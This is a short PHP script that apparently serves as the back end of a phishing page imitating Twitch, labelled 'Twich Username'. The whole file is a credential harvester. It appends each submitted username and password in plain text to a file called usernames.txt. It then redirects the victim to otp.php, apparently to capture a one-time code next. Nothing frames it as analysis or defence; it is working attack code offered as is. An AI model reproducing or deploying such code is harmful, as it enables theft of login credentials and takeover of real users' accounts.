<?php
file_put_contents("usernames.txt", "Twich Username: " . $_POST["Username"] . "\nPassword: " . $_POST["password"] . "\n", FILE_APPEND);
header("Location: otp.php");
exit();
?>
